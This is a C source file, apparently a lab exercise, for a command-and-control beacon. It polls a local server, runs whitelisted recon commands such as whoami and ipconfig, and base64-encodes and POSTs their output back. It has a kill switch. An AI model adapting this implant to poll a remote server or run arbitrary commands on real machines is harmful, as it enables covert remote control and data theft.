#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <curl/curl.h>

// Configuracoes baseadas no seu escopo
#define AGENT_ID "maquina01"
#define URL_CHECK "http://127.0.0.1:8080/check?id=" AGENT_ID
#define URL_RESULT "http://127.0.0.1:8080/result"

// Estrutura para salvar a resposta do GET em memoria
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Callback do curl para salvar o texto do GET
size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(ptr == NULL) return 0; // Out of memory
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

// Funcao simples de Base64 Encode para o Bonus do Wireshark
char* base64_encode(const unsigned char *data, size_t input_length) {
    static const char encoding_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t output_length = 4 * ((input_length + 2) / 3);
    char *encoded_data = malloc(output_length + 1);
    if (encoded_data == NULL) return NULL;
    for (int i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }
    for (int i = 0; i < (3 - input_length % 3) % 3; i++) encoded_data[output_length - 1 - i] = '=';
    encoded_data[output_length] = '\0';
    return encoded_data;
}

// Executa o comando, converte para Base64 e envia via POST
void executar_e_enviar(const char *cmd) {
    char buffer[1024];
    char output_total[4096] = ""; // Armazena a saida do comando

    // popen executa o comando e permite ler a saida do terminal
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) return;

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(output_total, buffer, sizeof(output_total) - strlen(output_total) - 1);
    }
    pclose(fp);

    // Converte a saida para Base64
    char *b64_output = base64_encode((unsigned char*)output_total, strlen(output_total));
    
    // Inicia o envio via POST
    CURL *curl = curl_easy_init();
    if(curl) {
        // Escapa os caracteres do Base64 (como '+' e '=') para URL HTTP
        char *url_encoded_b64 = curl_easy_escape(curl, b64_output, 0);
        
        // Monta o corpo do POST: id=maquina01&output=RESULTADO_BASE64
        char post_fields[8192];
        snprintf(post_fields, sizeof(post_fields), "id=%s&output=%s", AGENT_ID, url_encoded_b64);

        curl_easy_setopt(curl, CURLOPT_URL, URL_RESULT);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);
        
        // Dispara o POST silenciosamente
        curl_easy_perform(curl);
        
        curl_free(url_encoded_b64);
        curl_easy_cleanup(curl);
    }
    free(b64_output);
}

int main(void) {
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);

    while(1) {
        struct MemoryStruct chunk;
        chunk.memory = malloc(1);
        chunk.size = 0;

        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, URL_CHECK);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

            // Tenta conectar ao servidor
            res = curl_easy_perform(curl);

            if(res == CURLE_OK) {
                // Tira quebras de linha caso o servidor Python mande
                chunk.memory[strcspn(chunk.memory, "\r\n")] = 0; 
                
                // --- LOGICA DE CONTROLE (Whitelist de Comandos) ---
                if (strcmp(chunk.memory, "NONE") == 0) {
                    // Nao faz nada, so espera o proximo ciclo
                } 
                else if (strcmp(chunk.memory, "SHUTDOWN_AGENT") == 0) {
                    free(chunk.memory);
                    curl_easy_cleanup(curl);
                    exit(0); // Kill Switch
                } 
                else if (strcmp(chunk.memory, "whoami") == 0 || 
                         strcmp(chunk.memory, "ipconfig") == 0 || 
                         strcmp(chunk.memory, "ls") == 0 || 
                         strcmp(chunk.memory, "dir") == 0) {
                    
                    // Executa o comando autorizado e devolve o POST
                    executar_e_enviar(chunk.memory);
                }
            }
            curl_easy_cleanup(curl);
        }
        free(chunk.memory);
        
        // Dorme os 10 segundos exatos do escopo
        sleep(10);
    }

    curl_global_cleanup();
    return 0;
}
